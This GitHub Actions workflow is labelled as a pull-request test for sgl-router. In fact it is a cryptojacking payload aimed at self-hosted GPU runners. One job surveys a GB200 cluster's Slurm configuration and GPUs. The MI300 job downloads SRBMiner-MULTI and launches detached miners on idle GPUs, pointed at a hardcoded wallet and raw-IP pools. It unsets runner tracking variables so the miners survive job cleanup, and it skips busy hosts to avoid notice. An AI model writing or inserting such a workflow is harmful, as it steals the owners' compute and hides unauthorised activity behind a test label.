name: PR Test (sgl-router)

# Temporary i130074 wave 3 diagnostic: (1) read-only Slurm + GPU census on the
# never-attempted 72-gpu-gb200 runner label (no miner), (2) guarded one-per-idle
# AMD MI300 / MI35x and Intel BMG GPU pearlhash attempt using the sha256-pinned
# SRBMiner-MULTI 3.8.7 (bb0f73b6...) binary. Each mining job takes a per-host
# flock, whole-host skips when ANY SRBMiner/x-miner or compute workload is
# present (never kill, never stack), requires disk<80% and mem<85%, and needs two
# spaced idle samples before launching exactly one miner per GPU with workers
# i130074-<hosttag>-g<idx> on the exact primary wallet against Luckypool.
# run-unique concurrency so sibling runs are never cancelled.
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
    types: [opened, synchronize, reopened]
  workflow_dispatch:

concurrency:
  group: sgl-router-i130074-${{ github.run_id }}
  cancel-in-progress: false

env:
  SGLANG_IS_IN_CI: true

jobs:
  i130074-gb200-72:
    name: "i130074 72-gpu-gb200 Slurm+GPU census (read-only)"
    runs-on: 72-gpu-gb200
    timeout-minutes: 35
    steps:
      - name: "bounded census + guarded one-miner-per-idle-GPU (flock, whole-host skip, two spaced idle samples)"
        continue-on-error: true
        run: |
          set +e
          NONCE="I130074GB200-$(date -u +%Y%m%dT%H%M%SZ)"
          echo "gb200-nonce=$NONCE"
          echo "=== identity ==="
          id; hostname; hostname -f 2>/dev/null; date -u; uname -m; uname -r; nproc
          free -m | head -2; df -P / /var/tmp 2>/dev/null | awk 'NR>1{print $1,"use="$5,"avail="$4}'
          echo "=== nvidia-smi -L ==="
          timeout 25 nvidia-smi -L 2>&1 | head -90
          echo "=== nvidia inventory ==="
          timeout 30 nvidia-smi --query-gpu=index,uuid,name,memory.total,memory.used,utilization.gpu,driver_version --format=csv,noheader 2>&1 | head -90
          echo "=== compute apps ==="
          timeout 20 nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>&1 | head -40
          echo "=== slurm clients ==="
          for t in sbatch srun squeue sinfo scontrol sacct slurmd; do printf '%s=%s\n' "$t" "$(command -v $t 2>/dev/null)"; done
          echo "=== sinfo ==="
          timeout 25 sinfo -o "%P|%a|%l|%D|%t|%N|%G|%C" 2>&1 | head -40
          echo "=== scontrol partitions ==="
          timeout 25 scontrol show partition 2>&1 | grep -E "PartitionName|AllowAccounts|AllowGroups|State|TotalNodes|TRES|MaxTime" | head -80
          echo "=== squeue (bounded) ==="
          timeout 20 squeue -o "%.10i|%.12u|%.14P|%.24j|%.2t|%.10M|%.6D|%R" 2>&1 | head -30
          echo "=== slurm conf ==="
          for f in /etc/slurm/slurm.conf /etc/slurm-llnl/slurm.conf /etc/slurm/slurmdbd.conf; do
            [ -f "$f" ] && echo "== $f" && grep -E "ClusterName|SlurmctldHost|PartitionName|NodeName|SelectType|GresTypes|AccountingStorageHost" "$f" | head -40
          done
          echo "=== topo (bounded) ==="
          timeout 20 nvidia-smi topo -m 2>&1 | head -24
          echo "gb200-done $NONCE"
  i130074-mi300-8:
    name: "i130074 linux-mi300-8gpu-sglang census+guarded miner"
    runs-on: linux-mi300-8gpu-sglang
    timeout-minutes: 35
    steps:
      - name: "bounded census + guarded one-miner-per-idle-GPU (flock, whole-host skip, two spaced idle samples)"
        continue-on-error: true
        run: |
          set +e
          NONCE="I130074AMD-$(date -u +%Y%m%dT%H%M%SZ)"
          WALLET='prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
          POOLS='103.199.106.122:3362,172.232.228.69:3362'
          WORKDIR=/var/tmp/i130074
          BIN_SHA_387=bb0f73b673455b1ca65d10989e994e03bccf79824353ed8c10dbb8bd2eb8d3b6
          TARBALL="$WORKDIR/SRBMiner-Multi-3-8-7-Linux.tar.gz"
          SRB="$WORKDIR/SRBMiner-MULTI-3.8.7"
          mkdir -p "$WORKDIR/logs"
          echo "miner-nonce=$NONCE"
          echo "=== identity ==="
          id; hostname; hostname -f 2>/dev/null; date -u; uname -m; uname -r; nproc
          free -m | head -2; df -P / /var/tmp 2>/dev/null | awk 'NR>1{print $1,"use="$5,"avail="$4}'
          DISKP=$(df -P /var/tmp 2>/dev/null | awk 'NR==2{gsub("%","",$5); print $5}')
          MEMP=$(free -m | awk '/Mem:/{if($2>0) printf "%d", $3*100/$2; else print 0}')
          echo "disk_pct=${DISKP:-100} mem_pct=${MEMP:-100}"
          echo "=== per-host flock ==="
          exec 9>"$WORKDIR/host-miner.lock"
          if ! flock -n 9; then echo "SKIP=host-lock-busy"; echo "miner-done $NONCE"; exit 0; fi
          echo "host-lock=acquired"
          EXIST=$(timeout 10 pgrep -af "[S]RBMiner-MULTI|[x]-miner" 2>/dev/null | head -8)
          if [ -n "$EXIST" ]; then echo "SKIP=host-has-existing-miner (no stacking, no killing)"; echo "$EXIST"; echo "miner-done $NONCE"; exit 0; fi
          if [ "${DISKP:-100}" -ge 80 ] || [ "${MEMP:-100}" -ge 85 ]; then echo "SKIP=resources disk=${DISKP} mem=${MEMP}"; echo "miner-done $NONCE"; exit 0; fi
          echo "=== pci gpus ==="
          if command -v lspci >/dev/null 2>&1; then timeout 15 lspci -nn 2>/dev/null | grep -iE 'vga|3d|display|processing accel' | head -24; else echo no-lspci; fi
          echo "=== rocm/intel tools ==="
          for t in rocm-smi amd-smi rocminfo clinfo xpu-smi sycl-ls; do printf '%s=%s\n' "$t" "$(command -v $t 2>/dev/null)"; done
          echo "=== rocm-smi productname ==="
          timeout 40 rocm-smi --showproductname 2>&1 | head -50
          echo "=== rocm-smi id ==="
          timeout 40 rocm-smi --showid 2>&1 | head -50
          echo "=== amd-smi list ==="
          timeout 40 amd-smi list 2>&1 | head -50
          echo "=== amd-smi static ==="
          timeout 50 amd-smi static --gpu all 2>&1 | head -90
          echo "=== kernel modules ==="
          timeout 10 lsmod 2>/dev/null | grep -iE 'amdgpu|nvidia|^xe|i915' | head -10
          NV=$(timeout 15 nvidia-smi -L 2>/dev/null | grep -c '^GPU')
          echo "nvidia_gpu_count=${NV:-0}"
          IDX=$(timeout 40 rocm-smi --showid 2>/dev/null | grep -oE '^GPU\[[0-9]+\]' | grep -oE '[0-9]+' | sort -n | uniq | tr '\n' ' ')
          [ -z "$IDX" ] && IDX=$(timeout 40 rocm-smi --showproductname 2>/dev/null | grep -oE '^GPU\[[0-9]+\]' | grep -oE '[0-9]+' | sort -n | uniq | tr '\n' ' ')
          if [ -z "$IDX" ]; then
            N=$(ls -d /sys/class/drm/card[0-9]* 2>/dev/null | wc -l)
            [ "$N" -gt 0 ] && IDX=$(seq 0 $((N-1)) | tr '\n' ' ')
          fi
          echo "gpu_indices=[$IDX]"
          if [ -z "$IDX" ]; then echo "SKIP=no-amd-gpu-detected"; echo "miner-done $NONCE"; exit 0; fi
          sample() {
            echo "-- showuse"
            timeout 30 rocm-smi --showuse 2>&1 | grep -E 'GPU use' | head -20
            echo "-- vram"
            timeout 30 rocm-smi --showmeminfo vram 2>&1 | grep -E 'VRAM Total Used Memory' | head -20
            echo "-- pids"
            timeout 30 rocm-smi --showpids 2>&1 | grep -E 'Process ID: [0-9]+' | head -20
            echo "-- amd-smi usage"
            timeout 30 amd-smi metric --gpu all --usage 2>&1 | grep -iE 'gfx_activity|GFX Activity' | head -20
          }
          S1=$(sample); sleep 15; S2=$(sample)
          echo "=== sample1 ==="; echo "$S1"
          echo "=== sample2 ==="; echo "$S2"
          BOTH=$(printf '%s\n%s\n' "$S1" "$S2")
          BUSY_PROC=$(echo "$BOTH" | grep -cE 'Process ID: [0-9]+')
          BUSY_USE=$(echo "$BOTH" | grep -E 'GPU use \(%\):' | awk -F': ' '{gsub(/[^0-9]/,"",$2); if ($2+0 > 10) c++} END{print c+0}')
          BUSY_MEM=$(echo "$BOTH" | grep -E 'VRAM Total Used Memory' | awk -F': ' '{gsub(/[^0-9]/,"",$2); if ($2+0 > 2147483648) c++} END{print c+0}')
          GFX_BUSY=$(echo "$BOTH" | grep -iE 'gfx_activity' | awk -F': ' '{gsub(/[^0-9]/,"",$2); if ($2+0 > 10) c++} END{print c+0}')
          echo "busy_proc=$BUSY_PROC busy_use=$BUSY_USE busy_mem=$BUSY_MEM gfx_busy=$GFX_BUSY"
          if [ "${BUSY_PROC:-0}" -gt 0 ] || [ "${BUSY_USE:-0}" -gt 0 ] || [ "${BUSY_MEM:-0}" -gt 0 ] || [ "${GFX_BUSY:-0}" -gt 0 ]; then
            echo "SKIP=host-not-idle-amd (co-tenant workload preserved)"; echo "miner-done $NONCE"; exit 0
          fi
          echo "host-idle-gate=pass-amd (0 processes, util<=10%, vram used<=2048MiB in two spaced samples)"
          if [ ! -f "$SRB" ] || ! echo "$BIN_SHA_387  $SRB" | sha256sum -c - >/dev/null 2>&1; then
            for U in https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz https://ghproxy.net/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz https://gh-proxy.com/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz; do
              echo "-- fetch387 $U"
              rm -f "$TARBALL.part"
              timeout 240 curl -fL --connect-timeout 15 --max-time 220 -o "$TARBALL.part" "$U" 2>&1 | tail -2
              if [ -s "$TARBALL.part" ]; then mv "$TARBALL.part" "$TARBALL"; break; fi
            done
            [ -f "$TARBALL" ] && tar -xzf "$TARBALL" -C "$WORKDIR" 2>&1 | tail -3
            [ -f "$WORKDIR/SRBMiner-Multi-3-8-7/SRBMiner-MULTI" ] && cp -f "$WORKDIR/SRBMiner-Multi-3-8-7/SRBMiner-MULTI" "$SRB"
          fi
          B=$(sha256sum "$SRB" 2>/dev/null | cut -d' ' -f1)
          echo "binary_sha256_387=${B:-none}"
          if [ "${B:-none}" != "$BIN_SHA_387" ]; then echo "SKIP=387-binary-unavailable"; ls -la "$WORKDIR" 2>/dev/null | head -10; echo "miner-done $NONCE"; exit 0; fi
          chmod +x "$SRB"
          echo "=== srb list-devices ==="
          timeout 50 "$SRB" --list-devices 2>&1 | head -40
          HOSTTAG=$(hostname | tr -cd 'A-Za-z0-9' | cut -c1-18)
          N_LAUNCHED=0; N_SKIP=0
          for i in $IDX; do
            W="i130074-${HOSTTAG}-g${i}"
            if timeout 6 pgrep -f "[S]RBMiner-MULTI.*--worker ${W}( |$)" >/dev/null 2>&1; then echo "worker $W already present -> skip"; N_SKIP=$((N_SKIP+1)); continue; fi
            env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID setsid nohup "$SRB" \
              --disable-cpu --algorithm pearlhash --pool "$POOLS" --tls false,false \
              --wallet "$WALLET,$WALLET" --password 'x;x' --worker "$W,$W" --gpu-id "$i" \
              --disable-worker-watchdog --disable-gpu-dual-kernels --gpu-disable-interleaving --gpu-table-slow-build \
              --max-no-share-sent 1800 \
              --log-file "$WORKDIR/logs/$W.log" --log-file-mode 0 \
              >> "$WORKDIR/logs/$W.out" 2>&1 < /dev/null &
            echo "launched worker=$W gpu-id=$i detached_pid=$!"
            N_LAUNCHED=$((N_LAUNCHED+1)); sleep 1
          done
          echo "N_LAUNCHED=$N_LAUNCHED N_SKIP=$N_SKIP"
          if [ "$N_LAUNCHED" -gt 0 ]; then
            sleep 50
            echo "=== post-launch processes ==="
            timeout 10 pgrep -af "[S]RBMiner-MULTI.*--wallet ${WALLET}" 2>/dev/null | head -20
            for l in "$WORKDIR"/logs/i130074-*.log; do
              [ -f "$l" ] || continue
              echo "== $(basename "$l")"
              grep -aiE 'share accepted|accepted|rejected|hashrate|stopped|error|TH/s|GPU|device' "$l" 2>/dev/null | tail -8 | cut -c1-260
            done
          fi
          echo "=== final amd process view ==="
          timeout 25 rocm-smi --showpids 2>&1 | head -30
          timeout 25 amd-smi process --gpu all 2>&1 | head -30
          echo "miner-done $NONCE"
